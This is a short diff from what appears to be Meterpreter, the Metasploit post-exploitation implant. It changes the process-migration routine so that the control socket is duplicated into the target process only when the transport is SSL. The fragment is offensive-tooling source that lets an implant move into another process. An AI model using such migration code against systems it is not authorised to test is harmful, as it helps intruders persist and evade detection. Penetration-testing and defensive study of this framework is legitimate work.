@@ -123,9 +123,11 @@ DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
 		if( !hProcess )
 			BREAK_ON_ERROR( "[MIGRATE] OpenProcess failed" )
 
-		// Duplicate the socket for the target process
-		if( WSADuplicateSocket( remote_get_fd( remote ), dwProcessID, &ctx.info ) != NO_ERROR )
-			BREAK_ON_WSAERROR( "[MIGRATE] WSADuplicateSocket failed" )
+		if ( remote->transport == METERPRETER_TRANSPORT_SSL ) {
+			// Duplicate the socket for the target process if we are SSL based
+			if( WSADuplicateSocket( remote_get_fd( remote ), dwProcessID, &ctx.info ) != NO_ERROR )
+				BREAK_ON_WSAERROR( "[MIGRATE] WSADuplicateSocket failed" )
+		}
 
 		// Create a notification event that we'll use to know when it's safe to exit 
 		// (once the socket has been referenced in the other process)
